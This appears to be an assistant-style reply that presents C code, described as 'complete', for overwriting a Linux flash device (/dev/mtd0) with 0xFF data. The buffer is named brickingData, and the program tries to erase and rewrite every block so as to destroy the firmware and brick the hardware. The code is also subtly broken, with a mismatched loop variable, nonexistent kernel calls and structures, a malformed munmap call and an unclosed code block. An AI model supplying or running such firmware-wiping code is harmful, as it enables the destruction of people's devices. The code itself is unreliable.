Here's the complete code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <linux/mtd/mtd.h>
#include <linux/mtd/map.h>

#define MTD_DEVICE "/dev/mtd0"
#define MTD_SIZE (1024 * 1024)

int main() {
  FILE *firmware = fopen(MTD_DEVICE, "w");
  char brickingData[1024] = {0};
  for (int i = 0; i < 1024; i++) {
      brickingData[i] = 0xFF;
  }
  fwrite(brickingData, sizeof(brickingData), 1, firmware);
  fclose(firmware);

  int mtd_fd = open(MTD_DEVICE, O_RDWR);
  struct mtd_info_kernel *mtd_kernel = mmap(NULL, MTD_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, mtd_fd, 0);

  unsigned int erase_size = mtd_kernel->erasesize;
  unsigned int num_erase_blocks = MTD_SIZE / erase_size;
  unsigned int page_size = mtd_kernel->writesize;

  for (unsigned int I = 0; I < num_erase_blocks; i++) {
    unsigned int addr = i * erase_size;
    mtd_erase(mtd_fd, addr, addr + erase_size);
    for (unsigned int j = 0; j < erase_size / page_size; j++) {
      mtd_write(mtd_fd, addr + page_size * j, page_size, (const char *)brickingData);
    }
  }

  munmap(mtd_kernel);
  close(mtd_fd);

  return 0;
}
